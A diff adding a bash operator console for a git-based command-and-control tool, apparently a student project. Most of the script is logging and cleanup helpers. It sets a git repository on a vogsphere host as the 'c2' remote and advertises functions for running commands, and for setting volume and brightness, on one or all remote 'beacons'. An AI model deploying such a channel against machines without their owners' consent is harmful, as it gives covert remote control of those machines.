@@ -1,0 +1,141 @@
+#!/usr/bin/env bash
+# Heavily uses bashisms, do not port to POSIX sh
+
+log () {
+	local level ansi
+
+	level="${1}"
+	shift
+	case "${level}" in
+		(critical) ansi="41;30" ;;
+		(fatal) ansi="41;30" ;;
+		(err) ansi="31" ;;
+		(warn) ansi="33" ;;
+		(info) ansi="34" ;;
+		(debug) ansi="90" ;;
+		(*) ansi="45;30" ;;
+	esac
+	printf "\033[${ansi}m%s: %s: %s: %s\033[m\n" "${0}" "${FUNCNAME[2]}" "${BASH_LINENO[1]}" "$*" >&2
+}
+
+critical () { log critical "${@}"; }
+fatal () { log fatal "${@}"; }
+err () { log err "${@}"; }
+warn () { log warn "${@}"; }
+info () { log info "${@}"; }
+debug () { log debug "${@}"; }
+_grey () { printf '\033[90m' >&2; }
+_rst () { printf '\033[m' >&2; }
+
+# Usage:
+# if logif -1; then hide; fi # never show this specific diagnostic
+# if logif 0; then debug; fi # show all diagnostics
+# if logif 1; then info; fi
+# if logif 2; then warning; fi
+# if logif 3; then error; fi # only show error and fatal diagnostics
+# if logif 4; then fatal; fi # only show fatal diagnostics
+# if logif 999; then critical; fi # always this specific diagnostic
+logif () {
+	local required_loglevel
+
+	required_loglevel="${1}"
+	[ -n "${required_loglevel}" ] || required_loglevel="999" # if not providing a parameter, always log
+	[ "${LOGLEVEL}" -le "${required_loglevel}" ]
+}
+
+# Remove temporary directory and cd back to a sane place
+_cleanup () {
+	printf '\n'
+	if logif 0
+	then
+		logif 2 && warn "Cleaning up..."
+		_grey
+			cd /
+			rm -rfv -- "${tmpdir}" |& xargs || { logif 3 && err "error deleting tmpdir"; }
+			cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
+		_rst
+	fi
+	logif 2 && warn "Exiting"
+}
+
+# Override git command to make it LOGLEVEL aware
+git () {
+	local subcomand
+	declare -i status
+
+	status="0"
+	subcomand="${1}"
+	[ -n "${subcomand}" ] || { command git; return 1; }
+	shift
+	if logif 0
+	then
+		_grey
+			1>&2 command git "${subcomand}" "${@}" ; status="${?}"
+		_rst
+		return "${status}"
+	else
+		2>/dev/null 1>&2 command git "${subcomand}" "${@}" ; status="${?}"
+		return "${status}"
+	fi
+}
+
+_check_ref () {
+	git ls-remote --heads --exit-code c2 -- "${1}"
+}
+
+init () {
+	trap _cleanup EXIT
+
+	LOGLEVEL="$((LOGLEVEL + 0))"
+	C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
+	POLL_RATE="5"
+	unset CDPATH
+
+	tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { logif 4 && fatal "error creating tmpdir"; exit 1; }
+	orig_dir="$(pwd)" || { logif 3 && err "error saving original dir"; }
+	cd -- "${tmpdir}" || { logif 4 && fatal "error changing to tmpdir"; exit 1; }
+
+	git init
+	git remote add c2 -- "${C2}"
+	if _check_ref main
+	then
+		git pull c2 main
+		git switch main
+	else
+		git branch --move main
+	fi
+	[ "$(command git branch --show-current)" = "main" ] || { logif 4 && fatal "Failed to be on 'main' branch! Exiting"; exit 1; }
+	if logif 0
+	then
+		_grey
+			pwd
+			ls -al
+			printf '%s\n' "${PWD@A}"
+			printf '%s\n' "${C2@A}"
+			printf '%s\n' "${POLL_RATE@A}"
+			printf '\n'
+		_rst
+	fi
+	alias lb='gitc2-list-beacons'
+	alias r='gitc2-run'
+}
+
+main () {
+	init "${@}"
+	logif 1 && info "You are in an interactive bash shell."
+	logif 1 && info "The following (unexported) shell functions are available:"
+	logif 1 && info $'\t'"- gitc2-list-beacons [--terse]"
+	logif 1 && info $'\t'"- gitc2-run CMD BEACON [BEACON...]"
+	logif 1 && info $'\t'"- gitc2-volume PERCENTAGE BEACON [BEACON...]"
+	logif 1 && info $'\t'"- gitc2-brightness PERCENTAGE BEACON [BEACON...]"
+	logif 1 && info $'\t'"- Arguments:"
+	logif 1 && info $'\t\t'"- BEACON: either a beacon id or 'all' selecting all beacons. 'all' cannot be negated"
+	logif 1 && info "Additionally, the following aliases are available:"
+	logif 1 && info $'\t'"- lb='gitc2-list-beacons'"
+	logif 1 && info $'\t'"- r='gitc2-run'"
+	logif 1 && info $'\t'"- v='gitc2-volume'"
+	logif 1 && info $'\t'"- b='gitc2-brightness'"
+	# bash -i
+}
+
+main "${@}"
